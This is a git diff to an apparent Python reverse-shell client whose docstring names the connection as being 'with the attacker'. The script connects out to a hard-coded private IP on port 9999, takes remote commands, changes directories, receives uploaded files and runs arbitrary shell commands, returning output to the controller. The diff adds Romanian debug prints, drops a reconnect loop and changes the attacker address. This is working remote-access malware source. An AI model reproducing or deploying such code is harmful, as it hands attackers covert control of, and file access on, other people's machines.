@@ -10,7 +10,9 @@ def receive_commands():
     """
     while True:
 
+        print("A primit data")
         data = s.recv(1024)
+        print(data)
         """In the case of the 'cd' shell command, change the directory path to the new one
         """
         if data[:3].decode("utf-8") == 'cd ':
@@ -60,9 +62,11 @@ def receive_commands():
                         f.close()
                         s.send(str.encode(os.getcwd() + '> '))
                         receive_file = False
+                        print("La final de upload")
                     else:
                         f.write(data)
                         data = s.recv(1024)
+                print("a iesit din while")
         elif (len(data) > 0) and (data.decode("utf-8") != "null"):
             """In other cases, execute another shell command using a child program in a new process
                     the command must be typed as in a shell prompt
@@ -75,9 +79,6 @@ def receive_commands():
         else:
             s.send(str.encode(os.getcwd() + '> '))
 
-        while not data:
-            connect_to_server()
-
 
 def connect_to_server():
     """Function used to create connection with the attacker + manage the incoming commands
@@ -86,7 +87,7 @@ def connect_to_server():
         global host
         global port
         global s
-        host = "192.168.0.66"
+        host = "192.168.0.45"
         port = 9999
         s = socket.socket()
         s.connect((host, port))
